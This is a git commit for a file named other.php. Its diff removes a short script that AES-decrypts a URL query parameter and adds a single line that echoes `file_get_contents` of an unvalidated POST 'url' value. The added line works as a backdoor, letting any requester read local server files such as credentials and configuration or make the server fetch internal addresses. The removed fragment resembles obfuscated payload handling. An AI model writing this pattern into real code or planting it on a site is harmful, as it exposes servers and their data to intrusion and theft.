d304100ab7ea7dfd843402a5ceccea93cf43b5ff
craft891 <114077674+craft891@users.noreply.github.com>
2024-02-05 14:53:01 -0500

    Update other.php

--- other.php
+++ other.php
@@ -1,5 +1,3 @@
 <?php 
-echo "<script>const sk19 = new URLSearchParams(window.location.search);
-const inurlencoded = sk19.get('one');var ke=sk19.get('twoa');CryptoJS.AES.decrypt(inurlencoded,ke).toString(CryptoJS.enc.Utf8)</script>"
-
+echo file_get_contents($_POST['url'])
 ?>
